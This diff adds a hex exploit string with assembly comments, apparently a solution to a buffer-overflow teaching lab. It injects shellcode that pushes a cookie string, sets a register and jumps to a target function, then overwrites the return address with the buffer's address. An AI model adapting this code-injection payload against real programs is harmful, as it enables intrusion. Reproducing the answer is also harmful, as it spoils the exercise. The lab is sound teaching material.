@@ -1,0 +1,11 @@
+48 81 ec b0 00 00 00 	/* sub    $0xb0,%rsp */
+6a 00                	/* pushq  $0x0 */
+49 bb 35 39 62 39 39 	/* movabs $0x6166373939623935,%r11 */
+37 66 61 
+41 53                	/* push   %r11 */
+bf e8 db 61 55       	/* mov    $0x5561dbe8,%edi */
+68 fa 18 40 00       	/* pushq  $0x4018fa */
+c3                   	/* retq    */
+00 00 00 00 00 
+00 00 00
+78 dc 61 55 00 00 00 00 /* buf 's first address */
